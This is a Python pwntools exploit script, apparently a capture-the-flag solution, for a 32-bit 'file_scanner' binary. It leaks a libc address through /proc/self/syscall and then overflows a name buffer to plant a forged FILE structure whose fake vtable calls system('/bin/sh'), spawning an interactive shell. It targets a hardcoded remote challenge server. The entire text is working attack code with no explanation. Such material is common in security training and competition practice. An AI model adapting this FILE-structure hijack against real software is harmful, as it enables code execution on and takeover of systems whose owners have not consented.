#!/usr/bin/env python3

from pwn import *
import random
import time
from ctypes import *

context.binary = exe = ELF("./file_scanner_patched",checksec=False)
libc = ELF("./libc_32.so.6",checksec=False)
ld = ELF("./ld-2.23.so",checksec=False)

def GDB():
    gdb.attach(p,gdbscript='''
    b*0x08048CC9
    c
    ''')
    input()
if args.REMOTE:
    p = remote("52.221.218.121", 30565)
else:
    p = process([exe.path])
    GDB()

p.sendafter(b"Are you Huster? Show me your ID: ",b"\n")
def open(name):
    p.sendlineafter(b"Your choice :",b"1")
    p.sendlineafter(b"Enter the filename: ",name)
def read():
    p.sendlineafter(b"Your choice :",b"2")
def show():
    p.sendlineafter(b"Your choice :",b"3")

open(b"/proc/self/syscall")
read()
show()
leak = int(str(p.recvline()[:-1])[66:66+10],16)

print(hex(leak))
libc.address = leak - 0x1ba569
log.info('[+]LIBC BASE:'+hex(libc.address))


file = FileStructure()
file.flags=b'/bin'
file._IO_read_ptr=b"/sh\x00"
file._lock=p32(0x804b2f8)
file.vtable=p32(0x804b178)
payload = b"A"*0x20+p32(exe.sym['fileContent']) + b"A"*(0x20 -4)+bytes(file)+p32(libc.sym['system'])*20
p.sendlineafter(b"Your choice :",b"4")
p.sendlineafter(b"What is your name: ",payload)

p.interactive()

